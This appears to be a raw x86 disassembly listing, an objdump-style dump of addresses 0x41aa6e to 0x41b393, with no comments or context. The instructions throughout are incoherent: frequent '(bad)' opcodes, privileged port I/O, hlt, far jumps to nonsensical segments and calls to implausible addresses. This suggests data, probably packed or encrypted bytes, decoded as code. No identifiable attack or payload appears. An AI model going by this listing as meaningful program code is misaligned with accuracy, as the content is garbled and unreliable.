  41aa6e:	shl    DWORD PTR [ebx],1
  41aa70:	ss call 0x6c1652b6
  41aa76:	test   eax,0x35ad1089
  41aa7b:	pop    ebp
  41aa7c:	mov    ecx,0x39026b
  41aa81:	in     eax,dx
  41aa82:	jo     0x41aa88
  41aa84:	retw   
  41aa86:	jo     0x41aa92
  41aa88:	mov    al,0x6b
  41aa8a:	popf   
  41aa8b:	call   0x41c093
	...
  41aaa8:	add    BYTE PTR [esi-0xba2cad3],ah
  41aaae:	(bad)  
  41aaaf:	test   BYTE PTR [esi+0x7f],0x8a
  41aab3:	sub    eax,0xc355f3f
  41aab8:	mov    ebp,DWORD PTR [ebx+0x4]
  41aabb:	pop    esp
  41aabc:	ror    DWORD PTR [ebx],0x5d
  41aabf:	add    DWORD PTR [esp+esi*4+0x3b88e8af],eax
  41aac6:	pusha  
  41aac7:	jle    0x41aa88
  41aac9:	dec    edi
  41aaca:	sbb    al,0xc
  41aacc:	add    edx,esi
  41aace:	pushf  
  41aacf:	jl     0x41ab1e
  41aad1:	lock test DWORD PTR [ecx],ecx
  41aad4:	mov    edi,DWORD PTR [ecx]
  41aad6:	mov    esp,0xbe8c4fd2
  41aadb:	xor    edi,edi
  41aadd:	fwait
  41aade:	push   es
  41aadf:	add    eax,0x7e641189
  41aae4:	inc    ebx
  41aae5:	pushf  
  41aae6:	test   BYTE PTR [eax],0x27
  41aae9:	cmp    DWORD PTR [eax],edi
  41aaeb:	add    al,0x43
  41aaed:	mov    esi,ds
  41aaef:	out    dx,eax
  41aaf0:	jmp    0x41aaee
  41aaf2:	dec    edx
  41aaf3:	xchg   BYTE PTR [ecx],cl
  41aaf5:	push   0xace97242
  41aafa:	stos   BYTE PTR es:[edi],al
  41aafb:	cli    
  41aafc:	aaa    
  41aafd:	outs   dx,DWORD PTR ds:[esi]
  41aafe:	sbb    dh,BYTE PTR [eax]
  41ab00:	call   0x42f545
  41ab05:	fiadd  WORD PTR [ebx]
  41ab07:	jg     0x41ab4c
  41ab09:	xchg   esp,eax
  41ab0a:	sub    edi,DWORD PTR [ebx+0x5d]
	...
  41ab25:	add    al,bh
  41ab27:	and    DWORD PTR [ecx+0x7c5bf530],0x45
  41ab2e:	in     al,dx
  41ab2f:	inc    esi
  41ab30:	inc    esi
  41ab31:	je     0x41ab2c
  41ab33:	jmp    0x7380:0x3e0f3bc9
  41ab3a:	push   esp
  41ab3b:	adc    DWORD PTR [ebp+ecx*1+0x5ee704f4],0xffffffeb
  41ab43:	ja     0x41ab19
  41ab45:	mov    ds:0x3e6810c,eax
  41ab4a:	hlt    
  41ab4b:	addr16 (bad) 
  41ab4d:	sub    edi,DWORD PTR [ebp-0x40]
  41ab50:	add    bl,BYTE PTR [edi+eax*4-0x8]
  41ab54:	out    0x3,al
  41ab56:	jae    0x41ab20
  41ab58:	out    dx,al
  41ab59:	jl     0x41ab8c
  41ab5b:	sub    DWORD PTR [esi],ebp
  41ab5d:	clc    
  41ab5e:	(bad)  
  41ab5f:	pop    ebp
  41ab60:	and    ah,BYTE PTR [edx]
  41ab62:	ret    
  41ab63:	push   0xbffd43da
  41ab68:	ror    BYTE PTR [esi],cl
  41ab6a:	mov    ah,0x70
  41ab6c:	das    
  41ab6d:	ror    BYTE PTR [ecx-0x34],cl
  41ab70:	das    
  41ab71:	inc    ebp
  41ab72:	clc    
  41ab73:	add    al,0x94
  41ab75:	jle    0x41aaff
  41ab77:	test   BYTE PTR [ebx],al
  41ab79:	retf   
  41ab7a:	and    al,0xcf
  41ab7c:	xchg   ebp,eax
  41ab7d:	jle    0x41ab8e
  41ab7f:	std    
  41ab80:	jno    0x41ab4b
  41ab82:	ret    
  41ab83:	and    DWORD PTR [edi-0x173c8fff],0x3
	...
  41aba1:	add    BYTE PTR [eax],al
  41aba3:	hlt    
  41aba4:	or     DWORD PTR [esi+0x1c],0xfffffff4
  41aba8:	imul   DWORD PTR [edx+0x2c]
  41abab:	test   BYTE PTR [edi+eiz*8],0xdb
  41abaf:	pop    ebx
  41abb0:	push   0x70dc13e7
  41abb5:	adc    al,0x4
  41abb7:	hlt    
  41abb8:	aam    0x73
  41abba:	iret   
  41abbb:	sub    ebx,DWORD PTR [ebp-0x7a]
  41abbe:	iret   
  41abbf:	cmp    ebp,DWORD PTR [eax+0x6a]
  41abc2:	out    0x47,eax
  41abc4:	add    eax,0xc27d7462
  41abc9:	sahf   
  41abca:	aam    0x6c
  41abcc:	aaa    
  41abcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abce:	(bad)  
  41abcf:	xor    eax,DWORD PTR ds:0x3c3b6000
  41abd5:	xchg   esp,esi
  41abd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd8:	pop    esp
  41abd9:	aas    
  41abda:	rol    DWORD PTR [ecx+ebp*2-0x7f0ad67c],1
  41abe1:	cli    
  41abe2:	call   0x2972b0de
  41abe7:	jae    0x41ac57
  41abe9:	je     0x41abe1
  41abeb:	ja     0x41ac13
  41abed:	add    BYTE PTR [esp+ebp*8-0x948803c],dh
  41abf4:	add    al,0x74
  41abf6:	jmp    0x4f6:0xccef5cbd
  41abfd:	add    BYTE PTR [ecx-0x31],ch
  41ac00:	add    cl,BYTE PTR [eax+0x6a]
  41ac03:	lock inc ax
  41ac06:	fiadd  WORD PTR [eax]
	...
  41ac20:	jb     0x41ac77
  41ac22:	(bad)  
  41ac23:	call   0x284eb1f
  41ac28:	lock pop ebp
  41ac2a:	xor    BYTE PTR [ebx+edi*4+0x3f],ah
  41ac2e:	call   0xfdaa5490
  41ac33:	jo     0x41abef
  41ac35:	arpl   WORD PTR [ebx-0x547f0b57],ax
  41ac3b:	call   0x573eb137
  41ac40:	hlt    
  41ac41:	jge    0x41ac76
  41ac43:	lods   eax,DWORD PTR ds:[esi]
  41ac44:	or     ebp,eax
  41ac46:	(bad)  
  41ac47:	mov    ebp,0xb650ff5c
  41ac4c:	lods   eax,DWORD PTR ds:[esi]
  41ac4d:	aam    0x30
  41ac4f:	test   eax,0x6e83dc8
  41ac54:	iret   
  41ac55:	imul   edi,ebp,0x10f3b765
  41ac5b:	cmp    bh,BYTE PTR fs:[edi]
  41ac5e:	call   0xfda9f490
  41ac63:	add    BYTE PTR [esi+0x20db80bb],ah
  41ac69:	shl    esp,0x7d
  41ac6c:	sbb    al,0x3
  41ac6e:	add    BYTE PTR [edx+0x33],ch
  41ac71:	dec    ecx
  41ac72:	dec    DWORD PTR [eax+edx*2+0x22ff4ff3]
  41ac79:	pop    ds
  41ac7a:	xchg   DWORD PTR [edi-0xb],eax
  41ac7d:	enter  0x18b1,0xdc
  41ac81:	add    al,BYTE PTR [ebp+0x45]
	...
  41ac9b:	add    BYTE PTR [eax],al
  41ac9d:	sub    eax,0xcafff881
  41aca2:	jle    0x41ad02
  41aca4:	add    ebp,ebx
  41aca6:	add    ch,BYTE PTR [edx+0x3b]
  41aca9:	mov    bh,0x0
  41acab:	mov    DWORD PTR [ebp+0x35],eax
  41acae:	push   edx
  41acaf:	cld    
  41acb0:	jne    0x41aca3
  41acb2:	hlt    
  41acb3:	aad    0xff
  41acb5:	nop
  41acb6:	fsubrp st(7),st
  41acb8:	xchg   ecx,eax
  41acb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acba:	add    eax,DWORD PTR [eax]
  41acbc:	mov    DWORD PTR [eax-0x22],edx
  41acbf:	jle    0x41acb9
  41acc1:	call   0x2:0x9c328166
  41acc8:	mov    edx,DWORD PTR [edx+0xa]
  41accb:	das    
  41accc:	fcmovnbe st,st(6)
  41acce:	shl    DWORD PTR [eax+0x5],0x4
  41acd2:	push   esp
  41acd3:	icebp  
  41acd4:	jmp    0x41ad2b
  41acd6:	retf   0x2e9d
  41acd9:	pop    esp
  41acda:	add    al,BYTE PTR [ebp-0x3fcd5ebb]
  41ace0:	mov    eax,edi
  41ace2:	enter  0x4534,0x91
  41ace6:	add    WORD PTR [ebx],0x25c
  41aceb:	add    BYTE PTR [ecx+0x4534e510],cl
  41acf1:	ins    DWORD PTR es:[edi],dx
  41acf2:	or     sp,0xfff4
  41acf6:	pop    ebx
  41acf7:	add    DWORD PTR [eax],eax
  41acf9:	jg     0x41ad0c
  41acfb:	pusha  
  41acfc:	mov    DWORD PTR [ecx+0x3c80eb],edi
	...
  41ad1a:	fs pop esp
  41ad1c:	inc    BYTE PTR [ebx+0x15c61]
  41ad22:	jg     0x41ad84
  41ad24:	mov    cl,0x8a
  41ad26:	in     al,dx
  41ad27:	xlat   BYTE PTR ds:[ebx]
  41ad28:	cmp    cl,BYTE PTR ds:0x47c70
  41ad2e:	hlt    
  41ad2f:	or     ch,BYTE PTR [ebp-0x17]
  41ad32:	cld    
  41ad33:	fistp  QWORD PTR [edx]
  41ad35:	je     0x41ad24
  41ad37:	xchg   esi,eax
  41ad38:	ja     0x41ad46
  41ad3a:	sbb    al,0xdc
  41ad3c:	push   0x3b
  41ad3e:	dec    ecx
  41ad3f:	sub    esi,DWORD PTR [ecx]
  41ad41:	sar    BYTE PTR [ebp-0x60],0x4d
  41ad45:	aaa    
  41ad46:	cmp    eax,edi
  41ad48:	cmc    
  41ad49:	push   eax
  41ad4a:	outs   dx,DWORD PTR ds:[esi]
  41ad4b:	cwde   
  41ad4c:	dec    ecx
  41ad4d:	mov    edi,eax
  41ad4f:	fadd   QWORD PTR [eax+0x2d8ff438]
  41ad55:	mov    esp,esi
  41ad57:	fld    TBYTE PTR [ebx]
  41ad59:	add    BYTE PTR [eax],ah
  41ad5b:	mov    cl,0x7a
  41ad5d:	dec    ebx
  41ad5e:	test   dl,ah
  41ad60:	imul   esp,DWORD PTR [esi+edi*2]
  41ad64:	inc    esi
  41ad65:	inc    ebx
  41ad66:	dec    esp
  41ad67:	push   ds
  41ad68:	sbb    al,BYTE PTR [edi+0x136e7831]
  41ad6e:	cmp    BYTE PTR [ecx-0x3f],ch
  41ad71:	(bad)  
  41ad72:	js     0x41ad7c
  41ad74:	pushf  
  41ad75:	xchg   DWORD PTR [ecx-0x5fa48415],edi
  41ad7b:	hlt    
  41ad7c:	out    dx,eax
  41ad7d:	mov    bh,0x0
	...
  41ad97:	cmp    ebx,DWORD PTR [eax]
  41ad99:	dec    eax
  41ad9a:	add    esp,esi
  41ad9c:	pop    ebx
  41ad9d:	add    eax,ebp
  41ad9f:	mov    edi,0xf4050604
  41ada4:	jns    0x41ade2
  41ada6:	pop    esp
  41ada7:	js     0x41aded
  41ada9:	sbb    al,0x2b
  41adab:	jge    0x41ad6c
  41adad:	stos   BYTE PTR es:[edi],al
  41adae:	ret    
  41adaf:	jp     0x41ad70
  41adb1:	mov    ds:0xf960b72a,al
  41adb6:	mov    al,ds:0xfbfb4977
  41adbb:	jl     0x41ad7c
  41adbd:	jb     0x41ae04
  41adbf:	clc    
  41adc0:	add    DWORD PTR ds:0x56bf6cc3,ecx
  41adc6:	outs   dx,BYTE PTR ds:[esi]
  41adc7:	sub    BYTE PTR [ebp-0x84fe7aa],dl
  41adcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adce:	add    ebp,DWORD PTR [ebp-0x2e]
  41add1:	ss rcr eax,cl
  41add4:	sbb    DWORD PTR [eax+0x7a],edi
  41add7:	aas    
  41add8:	pop    ecx
  41add9:	jmp    0xc31d:0xf26d3b3a
  41ade0:	fs jmp 0x2f7a:0xec2734b
  41ade8:	or     eax,0x909fc816
  41aded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adee:	pop    edi
  41adef:	(bad)  
  41adf1:	push   es
  41adf2:	(bad)  
  41adf3:	jne    0x41ae0e
  41adf5:	(bad)  
  41adf6:	ins    DWORD PTR es:[edi],dx
  41adf7:	xchg   ecx,eax
  41adf8:	and    BYTE PTR [esi+0x1b],dl
	...
  41ae12:	add    BYTE PTR [eax],al
  41ae14:	pop    es
  41ae15:	pmaxsw mm6,mm7
  41ae18:	xchg   DWORD PTR [ebp-0x3e],ebp
  41ae1b:	pop    ds
  41ae1c:	jnp    0x41ae82
  41ae1e:	rcl    BYTE PTR [eax],cl
  41ae20:	ja     0x41ae62
  41ae22:	pop    esp
  41ae23:	stc    
  41ae24:	push   0x2f5cd2da
  41ae29:	xor    ch,al
  41ae2b:	add    edi,ebx
  41ae2d:	shl    DWORD PTR [edx+0x58b779],0x60
  41ae34:	xor    DWORD PTR [eax],ebp
  41ae36:	xchg   DWORD PTR [esi],ecx
  41ae38:	loopne 0x41ae84
  41ae3a:	inc    ebx
  41ae3b:	mov    ds:0x85438df7,al
  41ae40:	lods   eax,DWORD PTR ds:[esi]
  41ae41:	(bad)  
  41ae43:	sub    edx,0x9ce8ff2f
  41ae49:	(bad)  
  41ae4a:	fbstp  TBYTE PTR [edx+0xb]
  41ae4d:	je     0x41ae37
  41ae4f:	stos   BYTE PTR es:[edi],al
  41ae50:	repz arpl bp,di
  41ae53:	add    ecx,DWORD PTR fs:[eax+ebp*8-0x3f]
  41ae58:	sbb    DWORD PTR [ecx-0x3],esp
  41ae5b:	jae    0x41ae90
  41ae5d:	pop    ebp
  41ae5e:	jmp    0xc81a2156
  41ae63:	inc    ecx
  41ae64:	std    
  41ae65:	jmp    0xa75d:0x45264efc
  41ae6c:	lods   al,BYTE PTR ds:[esi]
  41ae6d:	dec    edx
  41ae6e:	ret    0xf7e5
  41ae71:	mov    bh,0x88
  41ae73:	inc    ebp
  41ae74:	ja     0x41aee6
  41ae76:	and    cl,ah
	...
  41ae90:	add    bh,dh
  41ae92:	add    al,0x81
  41ae94:	mov    WORD PTR [edi+0x5],cs
  41ae97:	push   ecx
  41ae98:	mov    bh,0xc8
  41ae9a:	jmp    0x41ae8b
  41ae9c:	and    dh,BYTE PTR [ebp+0x28a4c363]
  41aea2:	(bad)  
  41aea3:	std    
  41aea4:	fsub   st(7),st
  41aea6:	idiv   BYTE PTR [edi]
  41aea8:	jmp    0xab0dbf03
  41aead:	test   DWORD PTR [ebp-0x3a3c1ecd],0x73b26fff
  41aeb7:	and    ecx,0x62336c73
  41aebd:	icebp  
  41aebe:	test   eax,edi
  41aec0:	frstor [ebp+0x14]
  41aec3:	cmp    DWORD PTR [eax],eax
  41aec5:	or     cl,bl
  41aec7:	jb     0x41aef7
  41aec9:	mov    ecx,DWORD PTR [ecx+0x1]
  41aecc:	add    DWORD PTR [ecx],ecx
  41aece:	adc    DWORD PTR [edi+0x6ef0555d],eax
  41aed4:	or     al,0xc0
  41aed6:	dec    ecx
  41aed7:	or     edi,edi
  41aed9:	push   cs
  41aeda:	popa   
  41aedb:	xor    bh,bh
  41aedd:	in     eax,dx
  41aede:	rcr    BYTE PTR [ebx],0xd3
  41aee1:	or     eax,0xf4c08107
  41aee6:	data16 mov BYTE PTR [esi],al
  41aee9:	and    al,0x4a
  41aeeb:	in     eax,dx
  41aeec:	add    ecx,DWORD PTR [ebp+0x21f07984]
  41aef2:	fidiv  WORD PTR [eax-0x18]
	...
  41af0d:	add    BYTE PTR [esi],bl
  41af0f:	leave  
  41af10:	xchg   BYTE PTR [ebp-0x1b],bl
  41af13:	ds in  eax,dx
  41af15:	retf   
  41af16:	sahf   
  41af17:	push   es
  41af18:	sti    
  41af19:	adc    eax,0x3ff4d1
  41af1e:	inc    bp
  41af20:	cmp    eax,0x81611d85
  41af25:	(bad)  
  41af27:	push   es
  41af28:	add    BYTE PTR [eax-0x33],ch
  41af2b:	push   es
  41af2c:	add    BYTE PTR [eax],dl
  41af2e:	gs aad 0x50
  41af31:	add    BYTE PTR [ebp-0x2ea275ca],bl
  41af37:	mov    ebp,0x68d5b1c
  41af3c:	xchg   DWORD PTR [ebp-0x1f],ecx
  41af3f:	test   BYTE PTR [ecx-0x38],ah
  41af42:	popf   
  41af43:	fisttp WORD PTR [eax-0x40]
  41af46:	ins    BYTE PTR es:[edi],dx
  41af47:	ffree  st(7)
  41af49:	(bad)  
  41af4a:	pop    eax
  41af4b:	mov    dl,0x0
  41af4d:	mov    eax,ecx
  41af4f:	(bad)  
  41af50:	out    0x7d,eax
  41af52:	mov    eax,0xf484faed
  41af57:	stos   DWORD PTR es:[edi],eax
  41af58:	stc    
  41af59:	cmp    DWORD PTR [esi+0x6d],0x1
  41af5d:	add    BYTE PTR [ebp-0xd],cl
  41af60:	add    al,BYTE PTR [eax]
  41af62:	hlt    
  41af63:	mov    ch,0x4
  41af65:	pop    ebp
  41af66:	jns    0x41af49
  41af68:	popa   
  41af69:	cmc    
  41af6a:	inc    ebx
  41af6b:	mov    bl,0x5c
  41af6d:	(bad)  
  41af6e:	sbb    BYTE PTR [ebx+0x8969],ch
	...
  41af88:	add    BYTE PTR [eax],al
  41af8a:	add    BYTE PTR [esp+esi*2],ah
  41af8d:	bound  ebp,QWORD PTR [edx-0xb]
  41af90:	imul   esp,DWORD PTR ds:0xdb6ea704,0x1
  41af97:	mov    ebx,0xf5d281d8
  41af9c:	imul   eax,DWORD PTR [ecx],0x6a
  41af9f:	loopne 0x41af9c
  41afa1:	(bad)  
  41afa3:	jo     0x41afbe
  41afa5:	xor    ch,bh
  41afa7:	sti    
  41afa8:	jmp    0x11d8:0xb3f3c884
  41afaf:	cmc    
  41afb0:	imul   eax,DWORD PTR [eax-0x79b39d40],0xfffffffd
  41afb7:	mul    BYTE PTR [eax-0x487674fb]
  41afbd:	imul   edi,ebp,0xb1d3cb
  41afc3:	hlt    
  41afc4:	imul   ebx,DWORD PTR [ecx-0x37],0xffffff86
  41afc8:	imul   eax,DWORD PTR [ecx],0xffffff8b
  41afcb:	jns    0x41b004
  41afcd:	push   0xfffffffd
  41afcf:	stos   DWORD PTR es:[edi],eax
  41afd0:	fwait
  41afd1:	jle    0x41af99
  41afd3:	inc    esp
  41afd4:	pop    es
  41afd5:	push   ds
  41afd6:	sbb    DWORD PTR [ebx-0x7ee70f92],0x8bfbb018
  41afe0:	pop    edx
  41afe1:	test   eax,0x16bf4b5
  41afe6:	call   0x3dab439
  41afeb:	hlt    
  41afec:	(bad)  
  41afed:	fs das 
	...
  41b007:	add    BYTE PTR [ecx+0x61],ch
  41b00a:	(bad)  
  41b00b:	shr    DWORD PTR [edx+ecx*2-0x3e],cl
  41b00f:	dec    eax
  41b010:	outs   dx,DWORD PTR ds:[esi]
  41b011:	xchg   ebx,edi
  41b013:	push   0x51
  41b015:	popa   
  41b016:	pop    ss
  41b017:	imul   eax,edi,0xc
  41b01a:	and    BYTE PTR fs:[eax],0x5e
  41b01e:	scas   al,BYTE PTR es:[edi]
  41b01f:	push   0xffffffa4
  41b021:	ins    BYTE PTR es:[edi],dx
  41b022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b023:	fdiv   DWORD PTR [ebx]
  41b025:	popa   
  41b026:	fs inc ebx
  41b028:	stc    
  41b029:	ja     0x41afd2
  41b02b:	jg     0x41b061
  41b02d:	xlat   BYTE PTR ds:[ebx]
  41b02e:	fbstp  TBYTE PTR [esi]
  41b030:	xor    al,0xea
  41b032:	outs   dx,DWORD PTR ds:[esi]
  41b033:	xor    BYTE PTR [eax],0x5e
  41b036:	jle    0x41b0a2
  41b038:	inc    ebx
  41b039:	jb     0x41b023
  41b03b:	add    esi,esp
  41b03d:	(bad)  
  41b03e:	fs popa 
  41b040:	add    DWORD PTR [ecx+0x66],esp
  41b043:	inc    ecx
  41b044:	hlt    
  41b045:	add    al,0xa7
  41b047:	mov    esp,0xc0625e66
  41b04c:	fisttp DWORD PTR [edi+ebx*8+0x6a11d386]
  41b053:	inc    ebx
  41b054:	add    BYTE PTR [esi+0x7d4f7896],dh
  41b05a:	cli    
  41b05b:	inc    ebx
  41b05c:	int3   
  41b05d:	push   ds
  41b05e:	nop
  41b05f:	add    al,0xf4
  41b061:	mov    BYTE PTR [edi],ah
  41b063:	out    dx,eax
  41b064:	xor    eax,0xa9b76c92
  41b069:	pusha  
  41b06a:	push   ss
  41b06b:	add    BYTE PTR ss:[eax],al
	...
  41b082:	add    BYTE PTR [eax],al
  41b084:	add    BYTE PTR [edx+0x7c30a38b],ch
  41b08a:	ins    DWORD PTR es:[edi],dx
  41b08b:	rcl    BYTE PTR [esi],1
  41b08d:	xchg   ebx,eax
  41b08e:	pusha  
  41b08f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b090:	xchg   BYTE PTR [ebx+0x9],cl
  41b093:	add    BYTE PTR [edx+0xd],ch
  41b096:	cmc    
  41b097:	jno    0x41b098
  41b099:	rol    DWORD PTR [esi+eiz*2+0x70],0xf7
  41b09e:	ins    BYTE PTR es:[edi],dx
  41b09f:	retf   
  41b0a0:	dec    esp
  41b0a1:	test   DWORD PTR [edi+eax*4],0x3eae82c
  41b0a8:	pop    esp
  41b0a9:	fwait
  41b0aa:	jo     0x41b0fc
  41b0ac:	push   ebx
  41b0ad:	hlt    
  41b0ae:	mov    eax,DWORD PTR [ebx-0x29e21d3]
  41b0b4:	sbb    ebx,ecx
  41b0b6:	sbb    esp,0xffffffb3
  41b0b9:	int    0x61
  41b0bb:	push   eax
  41b0bc:	xchg   ecx,eax
  41b0bd:	jne    0x41b07e
  41b0bf:	(bad)  
  41b0c0:	call   0x97349194
  41b0c5:	lea    esp,[edi-0x6a]
  41b0c8:	(bad)  
  41b0c9:	lea    esp,[ecx-0x76]
  41b0cc:	out    dx,al
  41b0cd:	(bad)  
  41b0cf:	jae    0x41b0ae
  41b0d1:	shr    DWORD PTR [ebx],cl
  41b0d3:	je     0x41b0b2
  41b0d5:	fcmovnb st,st(4)
  41b0d7:	jae    0x41b0b6
  41b0d9:	sar    DWORD PTR [esi+0x3e29ed73],cl
  41b0df:	jmp    0xe94a51d2
  41b0e4:	jecxz  0x41b08e
  41b0e6:	add    ch,cl
  41b0e8:	out    0x0,eax
	...
  41b102:	mov    al,ds:0x88ebe905
  41b107:	pop    edi
  41b108:	inc    esi
  41b109:	jb     0x41b0e6
  41b10b:	pop    es
  41b10c:	std    
  41b10d:	mov    edi,0xe17660cb
  41b112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b113:	pusha  
  41b114:	adc    ebp,DWORD PTR ds:0xb8ffc50a
  41b11a:	loopne 0x41b160
  41b11c:	mov    DWORD PTR [esi],esp
  41b11e:	inc    eax
  41b11f:	mov    ah,0xf2
  41b121:	push   cs
  41b122:	or     eax,0x1100c089
  41b127:	sti    
  41b128:	or     bh,BYTE PTR [esi+0xe889de]
  41b12e:	add    DWORD PTR [eax+ecx*2],ecx
  41b131:	movups XMMWORD PTR [edi],xmm0
  41b134:	std    
  41b135:	call   FWORD PTR [ebp-0x65]
  41b138:	or     al,0x84
  41b13a:	fadd   DWORD PTR [ebx]
  41b13c:	add    BYTE PTR [eax],al
  41b13e:	adc    eax,0xc0480055
  41b143:	pusha  
  41b144:	or     BYTE PTR [ebp+0x35],0x2
  41b148:	mov    BYTE PTR [ebp-0x7e],0x2
  41b14c:	cmp    bl,0x4f
  41b14f:	outs   dx,BYTE PTR ds:[esi]
  41b150:	or     ecx,DWORD PTR [ebp+0x69e8ad10]
  41b156:	add    esi,ebp
  41b158:	cli    
  41b159:	mov    edx,DWORD PTR [ebp-0x22]
  41b15c:	cli    
  41b15d:	jne    0x41b0f2
  41b15f:	(bad)  
  41b160:	jo     0x41b11e
  41b162:	jne    0x41b0f8
  41b164:	pop    edi
  41b165:	inc    DWORD PTR [eax]
	...
  41b17f:	jp     0x41b161
  41b181:	pop    eax
  41b182:	or     BYTE PTR [ebx+0x1a01f59e],al
  41b188:	fiadd  WORD PTR ds:0x87030d01
  41b18e:	jae    0x41b179
  41b190:	loope  0x41b1d0
  41b192:	or     BYTE PTR [edi+ebx*4+0x5],ah
  41b196:	test   DWORD PTR [ebx+0x6b],eax
  41b199:	or     BYTE PTR [eax+0x2a],dl
  41b19c:	pinsrw mm2,WORD PTR [edx],0x9d
  41b1a0:	add    al,BYTE PTR [edi+0xad450f0]
  41b1a6:	mov    ?,WORD PTR ds:0x18000002
  41b1ac:	lahf   
  41b1ad:	int    0x50
  41b1af:	xchg   DWORD PTR [eax],ebx
  41b1b1:	call   0xfb2f1ba8
  41b1b6:	mov    esi,esp
  41b1b8:	test   al,0x51
  41b1ba:	adc    DWORD PTR [ecx],0x4187010c
  41b1c0:	and    al,0xd2
  41b1c2:	mov    BYTE PTR [esi+eiz*1-0x1b0b2c42],bh
  41b1c9:	mov    ebp,0xe3e88cdb
  41b1ce:	cld    
  41b1cf:	jae    0x41b1c1
  41b1d1:	inc    ebx
  41b1d2:	or     eax,0x3e171
  41b1d7:	hlt    
  41b1d8:	call   0x148e85cb
  41b1dd:	loope  0x41b1db
  41b1df:	push   ebx
  41b1e0:	xor    eax,0x95
	...
  41b1f9:	add    BYTE PTR [eax],al
  41b1fb:	add    ah,dh
  41b1fd:	imul   edx,edi,0x3b
  41b200:	mov    ds:0x988376fe,eax
  41b205:	scas   al,BYTE PTR es:[edi]
  41b206:	gs std 
  41b208:	sahf   
  41b209:	imul   edx,ecx,0xfffffffc
  41b20c:	add    DWORD PTR [esi+ecx*1],ebx
  41b20f:	inc    eax
  41b210:	hlt    
  41b211:	jmp    0xf74f:0xe9690c3f
  41b218:	adc    eax,DWORD PTR [edi-0x21677c85]
  41b21e:	fs std 
  41b220:	jno    0x41b213
  41b222:	(bad)  
  41b223:	cld    
  41b224:	sti    
  41b225:	out    dx,al
  41b226:	shr    DWORD PTR [ecx-0xc],cl
  41b229:	out    0xed,al
  41b22b:	or     edi,DWORD PTR [ebp-0x80]
  41b22e:	enter  0xe3fc,0xb6
  41b232:	fs jbe 0x41b221
  41b235:	es jg  0x41b2a8
  41b238:	rol    esi,cl
  41b23a:	fs add ebp,esi
  41b23d:	imul   eax,DWORD PTR [ecx],0xfffffffd
  41b240:	jmp    0xf481c11c
  41b245:	jmp    0x356c:0x502ff6b
  41b24c:	test   eax,0x5f831e5d
  41b251:	aam    0x15
  41b253:	addr16 cdq 
  41b255:	add    al,0xde
  41b257:	jge    0x41b231
  41b259:	pop    ebp
  41b25a:	push   es
  41b25b:	addr16 jg 0x41b1e5
  41b25e:	adc    ebp,DWORD PTR [ebp+0x0]
	...
  41b279:	sbb    DWORD PTR [ebp-0x69],0xe76f4e5b
  41b280:	add    ebx,DWORD PTR [ebx-0xf]
  41b283:	in     eax,0x66
  41b285:	imul   eax,DWORD PTR [esi+0x24],0xe16bf46f
  41b28c:	pop    cx
  41b28e:	pop    ebp
  41b28f:	xor    eax,0x1e0cc767
  41b294:	addr16 out 0x48,eax
  41b297:	fld    st(3)
  41b299:	inc    ebx
  41b29a:	int    0xf9
  41b29c:	inc    ebx
  41b29d:	ins    DWORD PTR es:[edi],dx
  41b29e:	dec    ebp
  41b29f:	mov    edi,0xa65d2821
  41b2a4:	jg     0x41b2da
  41b2a6:	xlat   BYTE PTR ds:[ebx]
  41b2a7:	stc    
  41b2a8:	js     0x41b261
  41b2aa:	cmp    BYTE PTR [edi-0x3a],bh
  41b2ad:	xchg   esp,eax
  41b2ae:	pop    ebp
  41b2af:	mov    ?,WORD PTR [edx+0xc]
  41b2b2:	xchg   DWORD PTR [esi+0x176b22f0],eax
  41b2b8:	add    DWORD PTR [di+0x64],ebx
  41b2bc:	lock daa 
  41b2be:	ins    BYTE PTR es:[edi],dx
  41b2bf:	aas    
  41b2c0:	loope  0x41b2b2
  41b2c2:	pop    esp
  41b2c3:	push   0xffffffb8
  41b2c5:	jecxz  0x41b2cd
  41b2c7:	push   0xffffffea
  41b2c9:	add    esp,DWORD PTR [esi]
  41b2cb:	fst    DWORD PTR [esi]
  41b2cd:	dec    esi
  41b2ce:	cli    
  41b2cf:	pop    ebx
  41b2d0:	test   al,0x90
  41b2d2:	pop    ebx
  41b2d3:	inc    esi
  41b2d4:	data16 sub al,0x6d
  41b2d7:	fidiv  WORD PTR [ebx+0x620004f4]
	...
  41b2f5:	add    dh,al
  41b2f7:	add    BYTE PTR [edx+0x8],ch
  41b2fa:	das    
  41b2fb:	inc    edx
  41b2fc:	mov    DWORD PTR [edi],esi
  41b2fe:	dec    edi
  41b2ff:	fwait
  41b300:	sub    ch,al
  41b302:	test   DWORD PTR [edi-0x715d6340],0x1ddbc846
  41b30c:	je     0x41b2fb
  41b30e:	or     eax,DWORD PTR [ebp+0x73]
  41b311:	in     eax,0x76
  41b313:	shl    bh,1
  41b315:	fsin   
  41b317:	lds    ebp,FWORD PTR [ebx]
  41b319:	mov    edx,0xd57b83da
  41b31e:	sbb    eax,0x42177442
  41b323:	adc    edi,DWORD PTR [eax]
  41b325:	pop    ebp
  41b326:	daa    
  41b327:	mov    es,WORD PTR [ecx+0x19]
  41b32a:	sbb    eax,0x2a137442
  41b32f:	adc    edi,DWORD PTR [eax]
  41b331:	xor    eax,0x641deee3
  41b336:	mov    esp,DWORD PTR [ecx-0x4]
  41b339:	scas   al,BYTE PTR es:[edi]
  41b33a:	cdq    
  41b33b:	mov    esp,0x567f0e7
  41b340:	add    BYTE PTR [esi-0x5076d3db],bl
  41b346:	xchg   ecx,eax
  41b347:	aad    0x2b
  41b349:	cmp    DWORD PTR [ebx-0x57e61439],ecx
  41b34f:	jmp    0x86399b6a
  41b354:	(bad)  
  41b355:	fstp   DWORD PTR [eax+ebp*1+0x2a89]
	...
  41b370:	add    BYTE PTR [eax],al
  41b372:	add    BYTE PTR [esi+ebx*1],ah
  41b375:	(bad)
  41b378:	(bad)  [edi]
  41b37a:	jmp    0xf6ab6452
  41b37f:	bound  ebx,QWORD PTR [eax+0x5a594f04]
  41b385:	pop    eax
  41b386:	add    BYTE PTR ds:0xcd00aac9,ah
  41b38c:	loopne 0x41b3fc
  41b38e:	xor    al,0x56
  41b390:	sbb    edx,DWORD PTR [eax-0x73]
  41b393:	pop    eax
